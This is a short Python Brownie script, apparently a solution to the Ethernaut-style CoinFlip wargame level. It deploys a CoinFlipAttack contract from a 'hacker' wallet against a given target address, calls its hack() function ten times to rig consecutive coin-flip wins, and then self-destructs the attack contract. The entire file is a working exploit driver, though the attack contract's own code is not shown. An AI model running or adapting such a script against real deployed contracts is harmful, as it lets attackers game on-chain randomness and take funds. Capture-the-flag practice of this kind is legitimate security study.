from brownie import accounts, config, CoinFlip, CoinFlipAttack

def main(target):
    print(f'Target contract: {target}')
    hacker = accounts.add(config['wallets']['from_key'])
    attack = CoinFlipAttack.deploy(target, {'from': hacker})
    coinflip = CoinFlip.at(target)
    print(f'Attack address: {attack.address}')
    for i in range(0, 10):
        attack.hack({'from': hacker, 'gas_limit': 90000, 'allow_revert': True})
    print(f'Nb ok: {coinflip.consecutiveWins()}')
    attack.destroy({'from': hacker})

